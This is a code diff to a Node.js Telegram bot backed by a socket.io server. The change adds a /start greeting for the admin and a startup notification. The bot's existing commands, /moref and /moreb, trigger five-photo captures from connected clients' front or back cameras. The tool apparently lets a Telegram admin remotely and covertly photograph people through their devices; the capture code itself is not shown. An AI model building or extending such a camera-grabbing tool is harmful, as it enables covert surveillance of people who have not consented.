@@ -21,12 +21,17 @@ if (!token || !adminId) {
 // Initialize Telegram Bot (Polling mode)
 const bot = new TelegramBot(token, { polling: true });
 
-// Automatically register commands with Telegram Menu on server start
+// Automatically register commands and send online startup notification
 bot.setMyCommands([
+    { command: 'start', description: 'Start the bot and check status' },
     { command: 'moref', description: 'Front Camera 5 Photos Capture' },
     { command: 'moreb', description: 'Back Camera 5 Photos Capture' }
 ]).then(() => {
     console.log('Telegram bot commands registered successfully!');
+    // Send automatic online ping/notification to admin when server boots up
+    bot.sendMessage(adminId, "🟢 **Server is Online!**\nBot is fully active and ready to receive commands.").catch(err => {
+        console.error("Failed to send startup notification:", err);
+    });
 }).catch(err => {
     console.error('Failed to set Telegram commands:', err);
 });
@@ -64,6 +69,16 @@ io.on('connection', (socket) => {
     socket.on('disconnect', () => {
         console.log('Client disconnected:', socket.id);
     });
+});
+
+// Telegram Command: /start
+bot.onText(/\/start/, (msg) => {
+    const chatId = msg.chat.id;
+    if (chatId.toString() === adminId.toString()) {
+        bot.sendMessage(chatId, "👋 **Welcome back, Raj bhai!**\n\nSystem is fully operational.\nAvailable Commands:\n/moref - Capture 5 photos from Front Camera\n/moreb - Capture 5 photos from Back Camera");
+    } else {
+        bot.sendMessage(chatId, "Unauthorized access.");
+    }
 });
 
 // Telegram Command: /moref (Front Camera Capture)
